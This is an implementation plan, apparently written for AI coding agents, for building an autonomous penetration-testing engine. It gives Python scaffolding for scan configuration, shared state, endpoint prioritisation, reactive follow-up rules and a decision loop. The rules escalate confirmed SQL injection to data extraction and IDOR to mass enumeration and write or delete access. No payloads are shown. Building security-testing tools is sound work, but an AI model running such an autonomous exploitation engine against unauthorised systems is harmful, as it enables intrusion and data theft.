# XBOW-Level Pentest Engine — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Transform the 13-agent pentest tool into an autonomous, deep-exploitation engine with Playwright-based discovery, context-aware payloads, exploit chaining, and a reactive decision loop.

**Architecture:** Deterministic-first — 90% code logic, 10% optional LLM. Central ScanState object shared by all components. Decision loop replaces fixed phases. Every component follows the `_deterministic()` + optional `_llm_enhance()` pattern.

**Tech Stack:** Python 3.9+, Playwright (browser automation), httpx (HTTP), Rich (console output). No cloud APIs required.

**Spec:** `docs/superpowers/specs/2026-03-20-xbow-level-pentest-engine-design.md`

---

## File Map

### New files to create:

```
engine/
├── __init__.py
├── scan_state.py          — Central shared state (ScanState class)
├── config.py              — Centralized model/scan config
├── decision_engine.py     — OBSERVE→ANALYZE→DECIDE→ACT loop
├── reactive_rules.py      — Trigger rules for follow-up tests
├── priority_scorer.py     — Signal-based endpoint prioritization
└── lead_queue.py          — Priority queue for test targets

discovery/
├── __init__.py
├── playwright_crawler.py  — Authenticated browser crawling + traffic recording
├── api_schema_inference.py — Build synthetic API spec from traffic
├── passive_recon.py       — Headers, cookies, JWT, tech fingerprint, dirbusting
└── subdomain_enum.py      — DNS enumeration + takeover detection

exploit/
├── __init__.py
├── context_analyzer.py    — Reflection analysis + injection context detection
├── filter_detector.py     — Per-parameter filter/WAF profiling
├── waf_fingerprint.py     — WAF detection + bypass selection
├── callback_server.py     — Local HTTP listener for blind vuln proof
└── payload_library/
    ├── __init__.py
    ├── sqli.py            — 100+ SQLi payloads by DB type + bypass
    ├── xss.py             — 100+ XSS payloads by context + bypass
    ├── cmdi.py            — 50+ command injection payloads
    ├── ssti.py            — 50+ SSTI payloads by template engine
    └── auth.py            — JWT, session, RBAC attack payloads

chain/
├── __init__.py
├── graph_builder.py       — Finding relationship graph
├── chain_rules.py         — 30 predefined chain patterns
└── chain_verifier.py      — End-to-end chain execution + proof

agents/vuln/                — New agents (add to existing directory)
├── jwt.py
├── auth_bypass.py
├── rate_limit.py
├── file_upload.py
├── xxe.py
├── ssti.py
├── websocket.py
├── cache_poison.py
├── http_smuggling.py
├── subdomain.py
├── api_version.py
└── business_logic.py
```

### Existing files to modify:

```
agents/orchestrator.py     — Rewrite: decision loop replaces fixed phases
agents/base.py             — Add deterministic-first base + LLM hook pattern
agents/vuln/*.py (13 files)— Add _deterministic_test() method to each
validator.py               — Add context-aware validation, expanded payloads
report_engine.py           — Add chain section, improved cards
pipeline.py                — Simplify: thin wrapper around new engine
tools.py                   — Add new tool dispatch entries
```

---

## Phase 1: Engine Core (ScanState + Orchestrator Foundation)

### Task 1.1: Create engine/config.py — Centralized Configuration

**Files:**
- Create: `engine/__init__.py`
- Create: `engine/config.py`

- [ ] **Step 1: Create engine package**

```python
# engine/__init__.py
"""Core scan engine — shared state, decision loop, configuration."""
```

- [ ] **Step 2: Write config.py**

```python
# engine/config.py
"""Centralized scan configuration. Single source of truth for all settings."""

import os


class ScanConfig:
    """Scan-wide configuration. All components read from this."""

    # LLM settings
    llm_backend: str = "ollama"
    ollama_url: str = "http://localhost:11434/api/chat"
    ollama_model: str = "qwen2.5:14b"
    anthropic_model: str = "claude-haiku-4-5-20251001"
    anthropic_validator_model: str = "claude-sonnet-4-6"

    # Scan settings
    max_depth: int = 3                    # max crawl depth
    max_requests_per_second: int = 20     # rate limiting
    max_reactive_spawns: int = 10         # per endpoint
    max_chain_depth: int = 3              # reactive chain levels
    checkpoint_interval_sec: int = 300    # save state every 5 min
    aggressive_mode: bool = False         # safe mode by default

    # Excluded paths (no testing)
    excluded_paths: list = None

    # Authentication
    bearer_token: str = ""
    cookies: dict = None
    auth_headers: dict = None

    def __init__(self, **kwargs):
        self.excluded_paths = self.excluded_paths or []
        self.cookies = self.cookies or {}
        self.auth_headers = self.auth_headers or {}
        for k, v in kwargs.items():
            if hasattr(self, k):
                setattr(self, k, v)

    @property
    def llm_available(self) -> bool:
        if self.llm_backend == "anthropic":
            return bool(os.environ.get("ANTHROPIC_API_KEY"))
        return True  # Ollama assumed available

    def get_auth_headers(self) -> dict:
        """Build authorization headers for HTTP requests."""
        headers = dict(self.auth_headers)
        if self.bearer_token:
            headers["Authorization"] = f"Bearer {self.bearer_token}"
        return headers
```

- [ ] **Step 3: Verify import**

Run: `cd /Users/shyamk/Documents/pentest-agent && python3 -c "from engine.config import ScanConfig; c = ScanConfig(bearer_token='test'); print(c.get_auth_headers()); print('OK')"`
Expected: `{'Authorization': 'Bearer test'}` then `OK`

- [ ] **Step 4: Commit**

```bash
git add engine/
git commit -m "feat: add engine/config.py — centralized scan configuration"
```

---

### Task 1.2: Create engine/scan_state.py — The Shared Brain

**Files:**
- Create: `engine/scan_state.py`

- [ ] **Step 1: Write ScanState**

```python
# engine/scan_state.py
"""Central scan state — the shared brain all components read/write."""

import json
import os
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional
from queue import PriorityQueue


@dataclass
class Endpoint:
    """A discovered API endpoint with metadata."""
    url: str
    method: str = "GET"
    params: list = field(default_factory=list)     # list of param names
    body_fields: list = field(default_factory=list) # JSON body field names
    content_type: str = ""
    auth_required: bool = False
    response_status: int = 0
    response_headers: dict = field(default_factory=dict)
    priority_score: float = 0.0
    tags: set = field(default_factory=set)          # e.g. {"crud:create", "has_id_param"}

    @property
    def base_url(self) -> str:
        return self.url.split("?")[0]

    def __hash__(self):
        return hash((self.base_url, self.method))

    def __eq__(self, other):
        return isinstance(other, Endpoint) and self.base_url == other.base_url and self.method == other.method


@dataclass
class LeadItem:
    """A work item for the decision engine queue."""
    priority: float               # higher = more important
    endpoint: Endpoint
    vuln_type: str                # which agent should handle this
    reason: str                   # why this was queued
    parent_finding_id: str = ""   # if spawned by reactive rule
    depth: int = 0                # reactive chain depth

    def __lt__(self, other):
        return self.priority > other.priority  # max-heap (highest priority first)


class ScanState:
    """
    Thread-safe shared state for the entire scan.
    Every component reads from and writes to this object.
    """

    def __init__(self):
        self._lock = threading.Lock()

        # Discovery
        self.endpoints: list = []              # List[Endpoint]
        self.tech_stack: dict = {}             # {"frontend": "React", "backend": "Express", ...}
        self.auth_info: dict = {}              # {"type": "jwt", "cookie_names": [...], ...}
        self.waf_info: dict = {}               # {"detected": "cloudflare", "bypasses": [...]}

        # Testing
        self.filter_profiles: dict = {}        # {(url, param): {"blocks": [...], "allows": [...]}}
        self.tested: set = set()               # {(base_url, param, vuln_type), ...}
        self.lead_queue: PriorityQueue = PriorityQueue()

        # Results
        self.findings: list = []               # validated findings
        self.chains: list = []                 # exploit chains
        self.callback_hits: list = []          # OOB callback receipts
        self.js_secrets: list = []             # secrets from JS analysis

        # Control
        self.depth_tracker: dict = defaultdict(int)  # {(url, vuln_type): spawn_count}
        self.scan_start_time: float = 0.0
        self.scan_status: str = "idle"         # idle, discovering, exploiting, validating, complete

    # ── Thread-safe mutations ─────────────────────────────────

    def add_endpoint(self, endpoint: Endpoint):
        with self._lock:
            if endpoint not in self.endpoints:
                self.endpoints.append(endpoint)

    def add_endpoints(self, endpoints: list):
        with self._lock:
            existing = set(self.endpoints)
            for ep in endpoints:
                if ep not in existing:
                    self.endpoints.append(ep)
                    existing.add(ep)

    def add_finding(self, finding: dict):
        with self._lock:
            self.findings.append(finding)

    def add_findings(self, findings: list):
        with self._lock:
            self.findings.extend(findings)

    def mark_tested(self, url: str, param: str, vuln_type: str):
        with self._lock:
            self.tested.add((url.split("?")[0], param, vuln_type))

    def is_tested(self, url: str, param: str, vuln_type: str) -> bool:
        with self._lock:
            return (url.split("?")[0], param, vuln_type) in self.tested

    def enqueue_lead(self, item: LeadItem):
        """Add a work item to the lead queue if within depth limits."""
        key = (item.endpoint.base_url, item.vuln_type)
        with self._lock:
            if self.depth_tracker[key] >= 10:  # max reactive spawns per endpoint
                return False
            if item.depth > 3:  # max chain depth
                return False
            self.depth_tracker[key] += 1
        self.lead_queue.put(item)
        return True

    def next_lead(self) -> Optional[LeadItem]:
        """Get the next highest-priority work item. Returns None if empty."""
        try:
            return self.lead_queue.get_nowait()
        except Exception:
            return None

    def has_leads(self) -> bool:
        return not self.lead_queue.empty()

    def add_callback_hit(self, token: str, source_ip: str, data: str):
        with self._lock:
            self.callback_hits.append({
                "token": token,
                "source_ip": source_ip,
                "data": data,
                "timestamp": time.time(),
            })

    # ── Checkpoint / Resume ───────────────────────────────────

    def save_checkpoint(self, path: str):
        """Serialize state to disk for resume capability."""
        with self._lock:
            data = {
                "endpoints": [
                    {"url": e.url, "method": e.method, "params": e.params,
                     "body_fields": e.body_fields, "content_type": e.content_type,
                     "auth_required": e.auth_required, "priority_score": e.priority_score,
                     "tags": list(e.tags)}
                    for e in self.endpoints
                ],
                "tech_stack": self.tech_stack,
                "auth_info": self.auth_info,
                "waf_info": self.waf_info,
                "findings": self.findings,
                "chains": self.chains,
                "callback_hits": self.callback_hits,
                "js_secrets": self.js_secrets,
                "tested": [list(t) for t in self.tested],
                "scan_status": self.scan_status,
            }
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as f:
            json.dump(data, f, indent=2, default=str)

    @classmethod
    def load_checkpoint(cls, path: str) -> "ScanState":
        """Restore state from a checkpoint file."""
        with open(path) as f:
            data = json.load(f)
        state = cls()
        state.endpoints = [
            Endpoint(url=e["url"], method=e["method"], params=e.get("params", []),
                     body_fields=e.get("body_fields", []),
                     content_type=e.get("content_type", ""),
                     auth_required=e.get("auth_required", False),
                     priority_score=e.get("priority_score", 0),
                     tags=set(e.get("tags", [])))
            for e in data.get("endpoints", [])
        ]
        state.tech_stack = data.get("tech_stack", {})
        state.auth_info = data.get("auth_info", {})
        state.waf_info = data.get("waf_info", {})
        state.findings = data.get("findings", [])
        state.chains = data.get("chains", [])
        state.callback_hits = data.get("callback_hits", [])
        state.js_secrets = data.get("js_secrets", [])
        state.tested = {tuple(t) for t in data.get("tested", [])}
        state.scan_status = data.get("scan_status", "idle")
        return state

    # ── Stats ─────────────────────────────────────────────────

    def summary(self) -> dict:
        with self._lock:
            return {
                "endpoints": len(self.endpoints),
                "findings": len(self.findings),
                "chains": len(self.chains),
                "tested": len(self.tested),
                "leads_remaining": self.lead_queue.qsize(),
                "callback_hits": len(self.callback_hits),
                "status": self.scan_status,
            }
```

- [ ] **Step 2: Verify ScanState works**

Run: `python3 -c "
from engine.scan_state import ScanState, Endpoint, LeadItem
s = ScanState()
e = Endpoint(url='https://example.com/api/users', method='GET', params=['id'])
s.add_endpoint(e)
s.add_endpoint(e)  # duplicate, should not add twice
assert len(s.endpoints) == 1
s.mark_tested('https://example.com/api/users', 'id', 'sqli')
assert s.is_tested('https://example.com/api/users', 'id', 'sqli')
assert not s.is_tested('https://example.com/api/users', 'id', 'xss')
lead = LeadItem(priority=10.0, endpoint=e, vuln_type='sqli', reason='test')
s.enqueue_lead(lead)
assert s.has_leads()
got = s.next_lead()
assert got.vuln_type == 'sqli'
assert not s.has_leads()
s.add_finding({'vuln_type': 'sqli', 'url': 'test'})
print(s.summary())
s.save_checkpoint('/tmp/test_checkpoint.json')
s2 = ScanState.load_checkpoint('/tmp/test_checkpoint.json')
assert len(s2.endpoints) == 1
assert len(s2.findings) == 1
print('All ScanState tests passed.')
"`

Expected: Summary dict printed, then `All ScanState tests passed.`

- [ ] **Step 3: Commit**

```bash
git add engine/scan_state.py
git commit -m "feat: add ScanState — thread-safe shared brain for all scan components"
```

---

### Task 1.3: Create engine/priority_scorer.py — Endpoint Prioritization

**Files:**
- Create: `engine/priority_scorer.py`

- [ ] **Step 1: Write priority scorer**

```python
# engine/priority_scorer.py
"""Signal-based endpoint prioritization — tests high-value targets first."""

import re
from engine.scan_state import Endpoint


# ── Scoring signals ───────────────────────────────────────────

HIGH_PRIORITY_PARAMS = re.compile(
    r'(id|user_id|account_id|order_id|doc_id|file_id|record_id|'
    r'user|uid|email|username|role|admin|token|session|password|'
    r'redirect|url|callback|next|return|goto)',
    re.I,
)

STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}

LOW_PRIORITY_PATHS = re.compile(
    r'(/health|/ping|/status|/favicon|/robots\.txt|/sitemap|'
    r'/static/|/assets/|/cdn/|/analytics|\.js$|\.css$|\.png$|\.jpg$|\.svg$)',
    re.I,
)

INTERESTING_PATHS = re.compile(
    r'(/admin|/internal|/debug|/api/v\d|/upload|/download|/file|'
    r'/export|/import|/config|/settings|/profile|/account|'
    r'/login|/auth|/token|/reset|/password|/payment|/checkout|'
    r'/transfer|/webhook|/graphql)',
    re.I,
)

SENSITIVE_HEADERS = {
    "x-powered-by", "server", "x-debug", "x-request-id",
}


def score_endpoint(endpoint: Endpoint) -> float:
    """
    Score an endpoint 0-100 based on attack priority signals.
    Higher = more interesting = test first.
    """
    score = 30.0  # base

    # HIGH signals
    if endpoint.method in STATE_CHANGING_METHODS:
        score += 15.0

    for p in endpoint.params + endpoint.body_fields:
        if HIGH_PRIORITY_PARAMS.search(p):
            score += 20.0
            break

    if INTERESTING_PATHS.search(endpoint.url):
        score += 15.0

    # Parameter count — more params = more attack surface
    param_count = len(endpoint.params) + len(endpoint.body_fields)
    if param_count > 0:
        score += min(param_count * 3.0, 15.0)

    # LOW signals (reduce priority)
    if LOW_PRIORITY_PATHS.search(endpoint.url):
        score -= 25.0

    if not endpoint.params and not endpoint.body_fields and endpoint.method == "GET":
        score -= 10.0  # no input = lower attack surface

    # Response-based signals
    for h in endpoint.response_headers:
        if h.lower() in SENSITIVE_HEADERS:
            score += 5.0
            break

    return max(0.0, min(100.0, score))


def score_all_endpoints(endpoints: list) -> list:
    """Score and sort endpoints by priority (highest first)."""
    for ep in endpoints:
        ep.priority_score = score_endpoint(ep)
    return sorted(endpoints, key=lambda e: e.priority_score, reverse=True)
```

- [ ] **Step 2: Verify**

Run: `python3 -c "
from engine.scan_state import Endpoint
from engine.priority_scorer import score_endpoint
# High priority: POST with user_id param to /api/admin
e1 = Endpoint(url='https://example.com/api/admin/users', method='POST', params=['user_id'])
s1 = score_endpoint(e1)
# Low priority: GET static asset
e2 = Endpoint(url='https://example.com/static/logo.png', method='GET')
s2 = score_endpoint(e2)
assert s1 > 60, f'Admin POST should be high priority, got {s1}'
assert s2 < 20, f'Static asset should be low priority, got {s2}'
print(f'Admin POST: {s1}, Static: {s2} — OK')
"`

- [ ] **Step 3: Commit**

```bash
git add engine/priority_scorer.py
git commit -m "feat: add priority scorer — signal-based endpoint ranking"
```

---

### Task 1.4: Create engine/reactive_rules.py — Follow-Up Test Triggers

**Files:**
- Create: `engine/reactive_rules.py`

- [ ] **Step 1: Write reactive rules engine**

```python
# engine/reactive_rules.py
"""Reactive rules — when one agent finds something, trigger targeted follow-ups."""

from engine.scan_state import ScanState, Endpoint, LeadItem


# ── Rule definitions ──────────────────────────────────────────

REACTIVE_RULES = [
    {
        "name": "jwt_detected",
        "trigger_field": "auth_info",
        "trigger_condition": lambda state: state.auth_info.get("type") == "jwt",
        "spawn_vuln_types": ["jwt_algorithm", "jwt_claim_tamper", "jwt_expiry"],
        "priority": 85.0,
        "reason": "JWT authentication detected — test for algorithm confusion and claim tampering",
    },
    {
        "name": "403_forbidden",
        "trigger_field": "finding",
        "trigger_condition": lambda f: f.get("evidence", "").startswith("403")
            or "403" in str(f.get("details", {}).get("status_code", "")),
        "spawn_vuln_types": ["auth_bypass", "path_traversal", "verb_tamper"],
        "priority": 75.0,
        "reason": "403 Forbidden response — test bypass techniques",
    },
    {
        "name": "file_upload_endpoint",
        "trigger_field": "endpoint",
        "trigger_condition": lambda ep: any(
            kw in ep.url.lower() for kw in ["upload", "import", "file", "attach", "media"]
        ) and ep.method in ("POST", "PUT"),
        "spawn_vuln_types": ["file_upload", "xxe"],
        "priority": 80.0,
        "reason": "File upload endpoint found — test for unrestricted upload and XXE",
    },
    {
        "name": "sql_error_leaked",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "sql" in f.get("vuln_type", "").lower()
            and f.get("validated"),
        "spawn_vuln_types": ["sqli_union_extract", "sqli_blind_boolean", "sqli_time_based"],
        "priority": 90.0,
        "reason": "SQL injection confirmed — escalate to data extraction",
    },
    {
        "name": "cors_misconfigured",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "cors" in f.get("vuln_type", "").lower()
            and f.get("validated"),
        "spawn_vuln_types": ["cors_data_theft", "cors_csrf_chain"],
        "priority": 70.0,
        "reason": "CORS misconfiguration confirmed — test cross-origin data theft",
    },
    {
        "name": "idor_confirmed",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "idor" in f.get("vuln_type", "").lower()
            and f.get("validated"),
        "spawn_vuln_types": ["idor_mass_enum", "idor_write", "idor_delete"],
        "priority": 85.0,
        "reason": "IDOR confirmed — test mass enumeration and write/delete access",
    },
    {
        "name": "redirect_found",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "redirect" in f.get("vuln_type", "").lower()
            and f.get("validated"),
        "spawn_vuln_types": ["open_redirect_oauth_chain", "ssrf_via_redirect"],
        "priority": 65.0,
        "reason": "Open redirect confirmed — test OAuth token theft and SSRF chain",
    },
    {
        "name": "graphql_detected",
        "trigger_field": "endpoint",
        "trigger_condition": lambda ep: "graphql" in ep.url.lower()
            or ep.content_type == "application/graphql",
        "spawn_vuln_types": ["graphql_introspection", "graphql_depth", "graphql_batch", "graphql_injection"],
        "priority": 80.0,
        "reason": "GraphQL endpoint found — test introspection, depth, and injection",
    },
    {
        "name": "template_reflection",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "ssti" in f.get("vuln_type", "").lower()
            or ("reflect" in f.get("evidence", "").lower() and "{{" in f.get("payload", "")),
        "spawn_vuln_types": ["ssti_jinja", "ssti_twig", "ssti_freemarker"],
        "priority": 90.0,
        "reason": "Template injection signal — test framework-specific SSTI",
    },
    {
        "name": "xss_confirmed_no_csp",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "xss" in f.get("vuln_type", "").lower()
            and f.get("validated"),
        "spawn_vuln_types": ["xss_stored_check", "xss_dom_check"],
        "priority": 75.0,
        "reason": "XSS confirmed — test for stored and DOM variants",
    },
    {
        "name": "websocket_endpoint",
        "trigger_field": "endpoint",
        "trigger_condition": lambda ep: ep.url.startswith("ws://") or ep.url.startswith("wss://"),
        "spawn_vuln_types": ["websocket_injection", "websocket_auth_bypass"],
        "priority": 70.0,
        "reason": "WebSocket endpoint found — test for injection and auth bypass",
    },
    {
        "name": "versioned_api",
        "trigger_field": "endpoint",
        "trigger_condition": lambda ep: any(
            f"/v{v}/" in ep.url for v in ["2", "3", "4", "5"]
        ),
        "spawn_vuln_types": ["api_version_downgrade"],
        "priority": 60.0,
        "reason": "Versioned API detected — test for old unpatched versions",
    },
    {
        "name": "payment_endpoint",
        "trigger_field": "endpoint",
        "trigger_condition": lambda ep: any(
            kw in ep.url.lower()
            for kw in ["payment", "checkout", "cart", "order", "price", "billing", "invoice"]
        ),
        "spawn_vuln_types": ["business_logic", "rate_limit"],
        "priority": 80.0,
        "reason": "Payment/business endpoint — test for logic flaws and rate limiting",
    },
    {
        "name": "error_verbose",
        "trigger_field": "finding",
        "trigger_condition": lambda f: "sensitive" in f.get("vuln_type", "").lower()
            and any(kw in f.get("evidence", "").lower()
                    for kw in ["stack trace", "traceback", "exception", "debug"]),
        "spawn_vuln_types": ["sqli", "ssti", "path_traversal"],
        "priority": 70.0,
        "reason": "Verbose error output — application may be vulnerable to injection",
    },
]


def check_finding_triggers(finding: dict, state: ScanState) -> list:
    """Check if a new finding triggers any reactive rules. Returns list of LeadItems."""
    leads = []
    ep = Endpoint(
        url=finding.get("url", ""),
        method=finding.get("method", "GET"),
        params=[finding.get("param_name", "")] if finding.get("param_name") else [],
    )

    for rule in REACTIVE_RULES:
        if rule["trigger_field"] != "finding":
            continue
        try:
            if rule["trigger_condition"](finding):
                for vt in rule["spawn_vuln_types"]:
                    if not state.is_tested(ep.url, finding.get("param_name", ""), vt):
                        leads.append(LeadItem(
                            priority=rule["priority"],
                            endpoint=ep,
                            vuln_type=vt,
                            reason=rule["reason"],
                            parent_finding_id=finding.get("id", ""),
                            depth=1,
                        ))
        except Exception:
            pass  # rule condition failed — skip silently

    return leads


def check_endpoint_triggers(endpoint: Endpoint, state: ScanState) -> list:
    """Check if a discovered endpoint triggers reactive rules. Returns list of LeadItems."""
    leads = []

    for rule in REACTIVE_RULES:
        if rule["trigger_field"] != "endpoint":
            continue
        try:
            if rule["trigger_condition"](endpoint):
                for vt in rule["spawn_vuln_types"]:
                    if not state.is_tested(endpoint.url, "", vt):
                        leads.append(LeadItem(
                            priority=rule["priority"],
                            endpoint=endpoint,
                            vuln_type=vt,
                            reason=rule["reason"],
                            depth=0,
                        ))
        except Exception:
            pass

    return leads


def check_state_triggers(state: ScanState) -> list:
    """Check global state triggers (e.g., JWT detected). Returns list of LeadItems."""
    leads = []

    for rule in REACTIVE_RULES:
        if rule["trigger_field"] not in ("auth_info", "tech_stack", "waf_info"):
            continue
        try:
            if rule["trigger_condition"](state):
                # Apply to all endpoints
                for ep in state.endpoints[:10]:  # limit to top 10 endpoints
                    for vt in rule["spawn_vuln_types"]:
                        if not state.is_tested(ep.url, "", vt):
                            leads.append(LeadItem(
                                priority=rule["priority"],
                                endpoint=ep,
                                vuln_type=vt,
                                reason=rule["reason"],
                                depth=0,
                            ))
        except Exception:
            pass

    return leads
```

- [ ] **Step 2: Verify**

Run: `python3 -c "
from engine.scan_state import ScanState, Endpoint
from engine.reactive_rules import check_finding_triggers, check_endpoint_triggers
state = ScanState()
# Test: SQL injection finding should trigger escalation
finding = {'vuln_type': 'SQL Injection', 'validated': True, 'url': 'https://example.com/api', 'param_name': 'id'}
leads = check_finding_triggers(finding, state)
print(f'SQLi triggers: {len(leads)} leads')
assert len(leads) > 0, 'SQLi should trigger escalation'
# Test: upload endpoint should trigger file upload + XXE
ep = Endpoint(url='https://example.com/api/upload', method='POST')
leads2 = check_endpoint_triggers(ep, state)
print(f'Upload triggers: {len(leads2)} leads')
assert len(leads2) > 0, 'Upload should trigger file_upload + xxe'
print('All reactive rule tests passed.')
"`

- [ ] **Step 3: Commit**

```bash
git add engine/reactive_rules.py
git commit -m "feat: add reactive rules — 14 trigger patterns for follow-up tests"
```

---

### Task 1.5: Create engine/decision_engine.py — The OODA Loop

**Files:**
- Create: `engine/decision_engine.py`

- [ ] **Step 1: Write decision engine**

```python
# engine/decision_engine.py
"""
Decision Engine — the OBSERVE→ANALYZE→DECIDE→ACT loop.

Replaces the fixed-phase orchestrator with a continuous loop that
deepens testing where it finds weakness and stops when all leads
are exhausted.
"""

import time
import traceback
from rich.console import Console
from engine.scan_state import ScanState, Endpoint, LeadItem
from engine.config import ScanConfig
from engine.priority_scorer import score_all_endpoints
from engine.reactive_rules import (
    check_finding_triggers,
    check_endpoint_triggers,
    check_state_triggers,
)

console = Console()


class DecisionEngine:
    """
    Autonomous scan coordinator.

    Usage:
        engine = DecisionEngine(config, state)
        engine.register_discovery(discovery_func)
        engine.register_agent("sqli", sqli_test_func)
        engine.run(target_url)
    """

    def __init__(self, config: ScanConfig, state: ScanState):
        self.config = config
        self.state = state
        self._discovery_funcs = []     # list of callables: (target, config, state) -> None
        self._agent_dispatch = {}      # vuln_type -> callable(endpoint, config, state) -> list[findings]
        self._validators = []          # list of callables: (findings, config) -> list[findings]
        self._last_checkpoint = 0.0

    # ── Registration ──────────────────────────────────────────

    def register_discovery(self, func):
        """Register a discovery function: func(target, config, state) -> None (writes to state)."""
        self._discovery_funcs.append(func)

    def register_agent(self, vuln_type: str, func):
        """Register a test function: func(endpoint, config, state) -> list[findings]."""
        self._agent_dispatch[vuln_type] = func

    def register_validator(self, func):
        """Register a validation function: func(findings, config) -> list[findings]."""
        self._validators.append(func)

    # ── Main loop ─────────────────────────────────────────────

    def run(self, target: str):
        """Execute the full autonomous scan."""
        self.state.scan_start_time = time.time()
        self.state.scan_status = "discovering"

        console.print(f"\n[bold blue]═══ SCAN ENGINE START: {target} ═══[/]\n")

        # Phase: Discovery
        self._run_discovery(target)

        # Phase: Initial prioritization + queue seeding
        self._seed_initial_leads()

        # Phase: Check state-level triggers (JWT, WAF, etc.)
        state_leads = check_state_triggers(self.state)
        for lead in state_leads:
            self.state.enqueue_lead(lead)
        if state_leads:
            console.print(f"  [cyan]State triggers added {len(state_leads)} leads[/]")

        # Phase: OODA loop — process lead queue until empty
        self.state.scan_status = "exploiting"
        iteration = 0

        while self.state.has_leads():
            lead = self.state.next_lead()
            if lead is None:
                break

            iteration += 1
            self._maybe_checkpoint()

            # OBSERVE: what are we testing?
            vt = lead.vuln_type
            ep = lead.endpoint

            # Skip if already tested
            param = ep.params[0] if ep.params else ""
            if self.state.is_tested(ep.url, param, vt):
                continue

            # DECIDE: do we have an agent for this vuln type?
            # Map compound types to base types
            base_vt = vt.split("_")[0] if "_" in vt else vt
            agent_func = self._agent_dispatch.get(vt) or self._agent_dispatch.get(base_vt)

            if not agent_func:
                self.state.mark_tested(ep.url, param, vt)
                continue

            # ACT: run the agent
            console.print(
                f"  [{iteration}] [cyan]{vt}[/] → {ep.url[:70]} "
                f"[dim](priority={lead.priority:.0f}, depth={lead.depth})[/]"
            )

            try:
                new_findings = agent_func(ep, self.config, self.state)
                self.state.mark_tested(ep.url, param, vt)

                if new_findings:
                    for f in new_findings:
                        self.state.add_finding(f)

                        # ANALYZE: check if new findings trigger reactive rules
                        reactive_leads = check_finding_triggers(f, self.state)
                        for rl in reactive_leads:
                            rl.depth = lead.depth + 1
                            self.state.enqueue_lead(rl)

                        if reactive_leads:
                            console.print(
                                f"    [yellow]→ Reactive: {len(reactive_leads)} "
                                f"follow-up leads spawned[/]"
                            )

                    console.print(
                        f"    [bold red]Found {len(new_findings)} issue(s)[/]"
                    )
            except Exception as e:
                console.print(f"    [dim red]Agent error: {e}[/]")
                self.state.mark_tested(ep.url, param, vt)

        # Phase: Validation
        self.state.scan_status = "validating"
        if self._validators and self.state.findings:
            console.print(f"\n  [bold blue]Validation phase ({len(self.state.findings)} findings)[/]")
            for validator in self._validators:
                try:
                    self.state.findings = validator(self.state.findings, self.config)
                except Exception as e:
                    console.print(f"  [yellow]Validator error: {e}[/]")

        self.state.scan_status = "complete"
        elapsed = time.time() - self.state.scan_start_time

        console.print(
            f"\n[bold blue]═══ SCAN COMPLETE ═══[/]\n"
            f"  Duration: {elapsed:.0f}s | "
            f"Findings: {len(self.state.findings)} | "
            f"Endpoints: {len(self.state.endpoints)} | "
            f"Tests run: {len(self.state.tested)} | "
            f"Iterations: {iteration}"
        )

        # Final checkpoint
        self._save_checkpoint()

    # ── Internal ──────────────────────────────────────────────

    def _run_discovery(self, target: str):
        """Run all registered discovery functions."""
        console.print("[bold]Phase: Discovery[/]")
        for i, func in enumerate(self._discovery_funcs, 1):
            name = getattr(func, "__name__", f"discovery_{i}")
            console.print(f"  Running {name}...")
            try:
                func(target, self.config, self.state)
            except Exception as e:
                console.print(f"  [yellow]Discovery error ({name}): {e}[/]")

        console.print(
            f"  [green]Discovery complete: "
            f"{len(self.state.endpoints)} endpoints[/]\n"
        )

    def _seed_initial_leads(self):
        """Score all endpoints, create initial test leads for all registered agents."""
        score_all_endpoints(self.state.endpoints)

        # Check endpoint-level reactive triggers
        endpoint_leads = []
        for ep in self.state.endpoints:
            endpoint_leads.extend(check_endpoint_triggers(ep, self.state))

        # For every endpoint × every base agent, create a lead
        base_vuln_types = [
            "sqli", "xss", "cmdi", "path_traversal", "csrf",
            "idor", "ssrf", "open_redirect", "security_headers", "sensitive_data",
        ]

        count = 0
        for ep in self.state.endpoints:
            if ep.priority_score < 5:
                continue  # skip near-zero priority
            for vt in base_vuln_types:
                # Only test parameterized endpoints for injection types
                injection_types = {"sqli", "xss", "cmdi", "path_traversal", "ssrf"}
                if vt in injection_types and not ep.params and not ep.body_fields:
                    continue
                lead = LeadItem(
                    priority=ep.priority_score,
                    endpoint=ep,
                    vuln_type=vt,
                    reason="initial_scan",
                )
                self.state.enqueue_lead(lead)
                count += 1

        # Add endpoint-triggered leads
        for lead in endpoint_leads:
            self.state.enqueue_lead(lead)
            count += 1

        console.print(
            f"  [green]Seeded {count} test leads "
            f"(sorted by priority)[/]\n"
        )

    def _maybe_checkpoint(self):
        """Save checkpoint if enough time has passed."""
        now = time.time()
        if now - self._last_checkpoint > self.config.checkpoint_interval_sec:
            self._save_checkpoint()
            self._last_checkpoint = now

    def _save_checkpoint(self):
        """Save current state to disk."""
        try:
            self.state.save_checkpoint("/tmp/pentest_checkpoint.json")
        except Exception:
            pass
```

- [ ] **Step 2: Verify engine instantiation and basic loop**

Run: `python3 -c "
from engine.scan_state import ScanState, Endpoint
from engine.config import ScanConfig
from engine.decision_engine import DecisionEngine

config = ScanConfig()
state = ScanState()

engine = DecisionEngine(config, state)

# Register a dummy discovery that adds 2 endpoints
def dummy_discovery(target, config, state):
    state.add_endpoint(Endpoint(url=f'{target}/api/users', method='GET', params=['id']))
    state.add_endpoint(Endpoint(url=f'{target}/api/health', method='GET'))

# Register a dummy agent that always finds nothing
def dummy_sqli(endpoint, config, state):
    return []

engine.register_discovery(dummy_discovery)
engine.register_agent('sqli', dummy_sqli)
engine.register_agent('xss', dummy_sqli)
engine.register_agent('security_headers', dummy_sqli)

engine.run('https://example.com')
print('Summary:', state.summary())
print('Engine loop test passed.')
"`

Expected: Discovery prints 2 endpoints, seeds leads, runs loop, completes, summary shows results.

- [ ] **Step 3: Commit**

```bash
git add engine/decision_engine.py
git commit -m "feat: add DecisionEngine — OODA loop replacing fixed-phase orchestrator"
```

---

## Phase 2: Existing Agent Migration

